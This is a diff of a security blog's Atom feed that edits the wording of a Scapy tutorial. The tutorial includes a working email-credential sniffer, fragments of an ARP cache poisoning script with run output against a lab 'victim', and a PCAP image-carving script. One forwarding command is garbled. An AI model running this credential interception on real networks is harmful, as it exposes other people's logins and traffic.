@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Higher Bytes by bt3</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/book.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-12-22T00:00:00-05:00</updated><entry><title>Black Hat Python: Infinite possibilities with the Scapy Module</title><link href="http://bt3gl.github.io/black-hat-python-infinite-possibilities-with-the-scapy-module.html" rel="alternate"></link><updated>2014-12-22T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-22:black-hat-python-infinite-possibilities-with-the-scapy-module.html</id><summary type="html">&lt;p&gt;This is a review about one of my favorites libraries in Python: &lt;a href="http://www.secdev.org/projects/scapy/"&gt;Scapy&lt;/a&gt;, which is a very powerful &lt;strong&gt;packet manipulation&lt;/strong&gt; resource.&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Higher Bytes by bt3</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/book.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-12-22T00:00:00-05:00</updated><entry><title>Black Hat Python: Infinite possibilities with the Scapy Module</title><link href="http://bt3gl.github.io/black-hat-python-infinite-possibilities-with-the-scapy-module.html" rel="alternate"></link><updated>2014-12-22T00:00:00-05:00</updated><author><name>bt3</name></author><id>tag:bt3gl.github.io,2014-12-22:black-hat-python-infinite-possibilities-with-the-scapy-module.html</id><summary type="html">&lt;p&gt;This is a review about one of my favorites libraries in Python, &lt;a href="http://www.secdev.org/projects/scapy/"&gt;Scapy&lt;/a&gt;, which is a very powerful &lt;strong&gt;packet manipulation&lt;/strong&gt; resource.&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Scapy&lt;/strong&gt;  is able to forge and decode packets of several protocols, send and capture them, match requests and replies, and much more. It can be used to handle most network tasks such as scanning, tracerouting, probing, attacks, network discovery, to name a few.&lt;/p&gt;
 &lt;p&gt;Before we start, make sure you have Scapy in your machine:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;pip install scapy
@@ -132,11 +132,6 @@ Sent 1 packets.
 &lt;img alt="" src="http://i.imgur.com/jjuWHaZ.png" /&gt;&lt;/p&gt;
 &lt;p&gt;To send the same packet over again we can simply add the &lt;strong&gt;loop=1&lt;/strong&gt; argument within the &lt;strong&gt;send&lt;/strong&gt; method:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;loop&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/div&gt;
-
-
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo python send_packet.py
-.....................................................................................................................
 &lt;/pre&gt;&lt;/div&gt;
 
 
@@ -357,17 +352,15 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 
 &lt;hr /&gt;
 &lt;h2&gt;&lt;a name="email"&gt;&lt;/a&gt; Stealing Email Data&lt;/h2&gt;
-&lt;p&gt;The idea of this script is to build a sniffer to capture &lt;a href="http://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol"&gt;SMTP&lt;/a&gt;, &lt;a href="http://en.wikipedia.org/wiki/Post_Office_Protocol"&gt;POP3&lt;/a&gt;, and &lt;a href="http://en.wikipedia.org/wiki/Internet_Message_Access_Protocol"&gt;IMAP&lt;/a&gt; credentials. Once we couple this sniffer with some &lt;a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack"&gt;MITM&lt;/a&gt; attack (such as **ARP poisoning), we can steal credentials from other machines in the network.&lt;/p&gt;
+&lt;p&gt;The idea of this script is to build a sniffer to capture &lt;a href="http://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol"&gt;SMTP&lt;/a&gt;, &lt;a href="http://en.wikipedia.org/wiki/Post_Office_Protocol"&gt;POP3&lt;/a&gt;, and &lt;a href="http://en.wikipedia.org/wiki/Internet_Message_Access_Protocol"&gt;IMAP&lt;/a&gt; credentials. Once we couple this sniffer with some &lt;a href="http://en.wikipedia.org/wiki/Man-in-the-middle_attack"&gt;MITM&lt;/a&gt; attack (such as &lt;strong&gt;ARP poisoning&lt;/strong&gt;), we can steal credentials from other machines in the network.&lt;/p&gt;
 &lt;p&gt;With this in mind, we write a script that runs a sniffer on all the interfaces, with no filtering. The &lt;strong&gt;sniff&lt;/strong&gt;'s &lt;strong&gt;store=0&lt;/strong&gt; attribute ensures that the packets are not kept in memory (so we can leave it running):&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
-
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;packet_callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
-    &lt;span class="c"&gt;# check to make sure it has a data payload&lt;/span&gt;
     &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
         &lt;span class="n"&gt;mail_packet&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
         &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;user&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;mail_packet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;pass&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;mail_packet&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
-            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] Server: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;
-            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;
+            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] Server: &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;IP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;dst&lt;/span&gt;
+            &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] &amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;TCP&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;payload&lt;/span&gt;
 
 &lt;span class="n"&gt;sniff&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;filter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;tcp port 110 or tcp port 25 or tcp port 143&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;prn&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;packet_callback&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;store&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
@@ -379,31 +372,22 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;p&gt;I talked about &lt;a href="http://bt3gl.github.io/wiresharking-for-fun-or-profit.html"&gt;ARP cache poisoning using command line arpspoof&lt;/a&gt; in my guide about Wireshark. Here we are going to see how to implement similar tool using Scapy.&lt;/p&gt;
 &lt;p&gt;ARP cache poisoning works by convincing a target machine that we are the gateway, and then convincing the gateway that all traffic should pass through our machine.&lt;/p&gt;
 &lt;p&gt;Every machine in a network maintains an ARP cache that stores the recent MAC addresses that match to IP addresses on the local network. All we need to do is to poison this cache with controlled entries.&lt;/p&gt;
-&lt;p&gt;The best way to test this is using a Windows virtual machine (take a look in &lt;a href="http://bt3gl.github.io/setting-up-a-playing-environment-with-virtual-machines.html"&gt;this guide I wrote&lt;/a&gt;).&lt;/p&gt;
-&lt;p&gt;Before the attack, go to the Windows box, open the terminal (&lt;code&gt;cmd&lt;/code&gt;) and check the IP and gateway IP address with&lt;code&gt;ipconfig&lt;/code&gt;. Then check the associated  ARP cache entry MAC address with &lt;code&gt;arp -a&lt;/code&gt;. We are going to use the former information and we will see the ARP data being changed:&lt;/p&gt;
+&lt;p&gt;The best way to test this is using a Windows virtual machine (take a look at &lt;a href="http://bt3gl.github.io/setting-up-a-playing-environment-with-virtual-machines.html"&gt;this guide I wrote&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;Before the attack, go to the Windows box, open the terminal (&lt;code&gt;cmd&lt;/code&gt;) and check the IP and gateway IP address with&lt;code&gt;ipconfig&lt;/code&gt;. Then check the associated  ARP cache entry MAC address with &lt;code&gt;arp -a&lt;/code&gt;:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="" src="http://i.imgur.com/ME069uS.png" /&gt;&lt;/p&gt;
-&lt;p&gt;Following is our ARP poisoning script (based on &lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;). The script does the following steps:&lt;/p&gt;
+&lt;p&gt;Our ARP poisoning script (based on &lt;a href="http://www.nostarch.com/blackhatpython"&gt;Black Hat Python&lt;/a&gt;) will perform the following steps:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;
 &lt;p&gt;Define constant values, set our interface card, and turn off output.&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;Resolve the gateway and target MAC address.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;The function &lt;strong&gt;get_mac&lt;/strong&gt; use the &lt;strong&gt;srp&lt;/strong&gt; method to emit an ARP request to an IP address to resolve the MAC address.&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;Resolve the gateway and target MAC address. The function &lt;strong&gt;get_mac&lt;/strong&gt; use the &lt;strong&gt;srp&lt;/strong&gt; method to emit an ARP request to an IP address to resolve the MAC address.&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;Start the poison thread to perform the ARP poisoning attack. This will start the sniffer that captures the packets.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;The function &lt;strong&gt;poison_target&lt;/strong&gt; builds ARP requests for poisoning both the target IP and the gateway (in a loop).&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;Start the poison thread to perform the ARP poisoning attack. This will start the sniffer that captures the packets. The function &lt;strong&gt;poison_target&lt;/strong&gt; builds ARP requests for poisoning both the target IP and the gateway (in a loop).&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;Write out the captured packets and restore the network.&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;The function &lt;strong&gt;restore_target&lt;/strong&gt; sends out the ARP packets to the network broadcast address to reset the ARP caches of the gateway and target machines.&lt;/li&gt;
-&lt;/ul&gt;
+&lt;p&gt;Write out the captured packets and restore the network. The function &lt;strong&gt;restore_target&lt;/strong&gt; sends out the ARP packets to the network broadcast address to reset the ARP caches of the gateway and target machines.&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;scapy.all&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
@@ -455,8 +439,8 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
         &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="ne"&gt;KeyboardInterrupt&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
             &lt;span class="n"&gt;restore_target&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;gateway_ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;gateway_mac&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;target_ip&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;target_mac&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
-        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] ARP poison attack finished.&amp;#39;&lt;/span&gt;
-        &lt;span class="k"&gt;return&lt;/span&gt;
+    &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;[*] ARP poison attack finished.&amp;#39;&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt;
 
 &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;__name__&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
     &lt;span class="n"&gt;conf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;iface&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;INTERFACE&lt;/span&gt;
@@ -496,12 +480,12 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;To run it, we need to tell the local host machine (Kali Linux) to forward packets along both the gateway and the target IP address:&lt;/p&gt;
+&lt;p&gt;To run this ARP cache poisoning script, we need to tell the local host machine (Kali Linux) to forward packets along both the gateway and the target IP address:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;&lt;span class="nb"&gt;echo &lt;/span&gt;1 /proc/sys/net/ipv4/ip_foward
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Running this in our attack machine (Kali Linux),&lt;/p&gt;
+&lt;p&gt;Finally, we run out script, which prints the following output:&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;sudo&lt;/span&gt; &lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="n"&gt;arp_cache_poisoning&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;
 &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Setting&lt;/span&gt; &lt;span class="n"&gt;up&lt;/span&gt; &lt;span class="n"&gt;wlp1s0&lt;/span&gt;
 &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="n"&gt;Gateway&lt;/span&gt; &lt;span class="mf"&gt;192.168.1.1&lt;/span&gt; &lt;span class="n"&gt;is&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="mo"&gt;00&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;a9&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;a3&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;f1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;46&lt;/span&gt;
@@ -513,9 +497,9 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;we see the changes in the victim's machine (Windows):&lt;/p&gt;
+&lt;p&gt;While running that, we can see the changes in the victim's machine (Windows):&lt;/p&gt;
 &lt;p&gt;&lt;img alt="" src="http://i.imgur.com/RFdIz4H.png" /&gt;&lt;/p&gt;
-&lt;p&gt;Now open in Wireshark the PCAP file resulting from the script. BAM! The entire traffic from the victim is in your hand!&lt;/p&gt;
+&lt;p&gt;Once you are done,  open the PCAP file resulting from the script. BAM! The entire traffic from the victim is in your hand!&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;&lt;a name="pcap"&gt;&lt;/a&gt; PCAP Processing to Find Images&lt;/h2&gt;
 &lt;p&gt;We have learned how to steal credentials from some email protocols, now let us extend this to all the traffic in the network!&lt;/p&gt;
@@ -539,9 +523,9 @@ WARNING: No route found &lt;span class="k"&gt;for &lt;/span&gt;IPv6 destination 
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;To try to detect images that contain human faces, first either create or download some PCAP files with these images. Some dump sources:
+&lt;p&gt;We are going to go through a script that tries to detect image with human faces. But, first, either create or download a PCAP file with these images. For instance, these are some PCAP dump online sources:
 &lt;a href="http://wiki.wireshark.org/SampleCaptures"&gt;here&lt;/a&gt;, &lt;a href="http://www.netresec.com/?page=PcapFiles"&gt;here&lt;/a&gt;, &lt;a href="http://www.pcapr.net/home"&gt;here&lt;/a&gt;, and &lt;a href="http://www.pcapr.net/browse?q=facebook+AND+png"&gt;here&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;The following script does the following:&lt;/p&gt;
+&lt;p&gt;OUr  script will basically do the following:&lt;/p&gt;
 &lt;p&gt;1) The function &lt;strong&gt;http_assembler&lt;/strong&gt; takes a PCAP and separates each TCP session in a dictionary. Then it loops in these section using the HTTP filter (which is the same as &lt;em&gt;Follow the TCP stream&lt;/em&gt; in Wireshark). After the HTTP data is assembled, it parses the headers with the &lt;strong&gt;get_http_headers&lt;/strong&gt; function and send to the &lt;strong&gt;extract_image&lt;/strong&gt; function. If the image header are returned, it saves the image and try to detect faces with the function &lt;strong&gt;face_detect&lt;/strong&gt;.&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;http_assembler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;PCAP&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;carved_images&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;faces_detected&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
